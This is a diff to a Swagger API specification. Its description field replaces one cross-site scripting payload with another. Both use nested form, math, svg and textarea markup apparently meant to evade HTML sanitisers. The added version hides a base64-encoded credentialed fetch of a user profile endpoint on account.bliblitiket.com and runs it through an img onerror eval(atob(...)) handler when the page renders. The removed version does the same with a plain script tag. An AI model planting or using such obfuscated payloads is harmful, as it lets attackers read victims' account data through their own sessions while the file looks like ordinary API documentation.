@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>function cors(){var xhttp=new XMLHttpRequest();xhttp.onreadystatechange=function(){if(this.status==200){alert(this.responseText);document.getElementById('demo').innerHTML=this.responseText;}};xhttp.open('GET','https://account.bliblitiket.com/gateway/gks-unm-go-be/api/v1/profile/details',true);xhttp.withCredentials=true;xhttp.send();}cors();</script>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x id='dXJsPSdodHRwczovL2FjY291bnQuYmxpYmxpdGlrZXQuY29tL2dhdGV3YXkvZ2tzLXVubS1nby1iZS9hcGkvdjEvcHJvZmlsZS9kZXRhaWxzJztmZXRjaCh1cmwse2NyZWRlbnRpYWxzOidpbmNsdWRlJ30pLnRoZW4oZnVuY3Rpb24ocmVzcG9uc2Upe3JldHVybityZXNwb25zZS50ZXh0KCk7fSkudGhlbihmdW5jdGlvbihkYXRhKXthbGVydChKU09OLnN0cmluZ2lmeShKU09OLnBhcnNlKGRhdGEpKSk7fSk7' onerror='eval(atob(this.id))'>"></form>
 
   version: production
 basePath: /JSSResource/
